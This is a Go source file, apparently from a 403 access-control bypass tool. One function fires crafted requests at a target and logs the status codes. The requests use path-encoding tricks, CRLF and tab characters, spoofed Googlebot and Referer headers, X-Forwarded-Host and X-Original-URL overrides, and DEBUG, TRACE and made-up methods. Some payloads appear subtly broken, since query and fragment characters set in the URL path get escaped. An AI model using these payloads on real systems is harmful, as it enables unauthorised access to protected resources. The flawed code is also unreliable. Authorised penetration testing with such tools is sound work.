package bypass

import (
	"net/http"
	"net/url"
)

// TestAdvancedPayloads tests specialized payloads for bypassing 403 responses
func TestAdvancedPayloads(baseURL string, client *http.Client, config Config) ([]Result, error) {
	var results []Result
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return results, err
	}

	// Various specialized techniques
	specializedPayloads := []struct {
		Path      string
		Method    string
		Headers   map[string]string
		Technique string
	}{
		{
			Path:      parsedURL.Path + "?",
			Method:    "GET",
			Headers:   nil,
			Technique: "Query Parameter Confusion",
		},
		{
			Path:      parsedURL.Path + "#admin",
			Method:    "GET",
			Headers:   nil,
			Technique: "URL Fragment Bypass",
		},
		{
			Path:      parsedURL.Path + "%",
			Method:    "GET",
			Headers:   nil,
			Technique: "URL Parsing Error",
		},
		{
			Path:      parsedURL.Path + "%09",
			Method:    "GET",
			Headers:   nil,
			Technique: "Tab Character",
		},
		{
			Path:      parsedURL.Path + "%0d%0a",
			Method:    "GET",
			Headers:   nil,
			Technique: "CRLF Injection",
		},
		{
			Path:   parsedURL.Path,
			Method: "GET",
			Headers: map[string]string{
				"Referer":    "https://www.google.com/",
				"Connection": "close",
			},
			Technique: "Search Engine Referrer",
		},
		{
			Path:   parsedURL.Path,
			Method: "GET",
			Headers: map[string]string{
				"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
			},
			Technique: "Search Bot User-Agent",
		},
		{
			Path:   parsedURL.Path,
			Method: "GET",
			Headers: map[string]string{
				"X-CSRF-Token": "",
				"X-API-Key":    "",
			},
			Technique: "Empty Security Headers",
		},
		{
			Path:      parsedURL.Path + "/.",
			Method:    "GET",
			Headers:   nil,
			Technique: "Path Dot Appending",
		},
		{
			Path:      parsedURL.Path,
			Method:    "DEBUG",
			Headers:   nil,
			Technique: "Non-standard HTTP Method",
		},
		{
			Path:      parsedURL.Path,
			Method:    "JEFF",
			Headers:   nil,
			Technique: "Made-up HTTP Method",
		},
		{
			Path:   parsedURL.Path,
			Method: "GET",
			Headers: map[string]string{
				"Accept": "*/*.*",
			},
			Technique: "Malformed Accept Header",
		},
		{
			Path:   parsedURL.Path,
			Method: "GET",
			Headers: map[string]string{
				"Host":             parsedURL.Host,
				"X-Forwarded-Host": "localhost",
			},
			Technique: "Host Override",
		},
		{
			Path:      parsedURL.Path,
			Method:    "TRACE",
			Headers:   nil,
			Technique: "TRACE Method",
		},
		{
			Path:      parsedURL.Path + "?" + parsedURL.RawQuery + "&_=" + parsedURL.Path,
			Method:    "GET",
			Headers:   nil,
			Technique: "Cache Buster Parameter",
		},
		{
			Path:   parsedURL.Path,
			Method: "GET",
			Headers: map[string]string{
				"X-Original-URL": "/",
				"X-Override-URL": "/",
			},
			Technique: "Multiple URL Override Headers",
		},
	}

	for _, payload := range specializedPayloads {
		manipulatedURL := *parsedURL
		manipulatedURL.Path = payload.Path

		req, err := http.NewRequest(payload.Method, manipulatedURL.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", config.UserAgent)
		if payload.Headers != nil {
			for header, value := range payload.Headers {
				req.Header.Set(header, value)
			}
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, Result{
			URL:        manipulatedURL.String(),
			StatusCode: resp.StatusCode,
			Method:     payload.Method,
			Technique:  "Specialized: " + payload.Technique,
		})
	}

	return results, nil
}
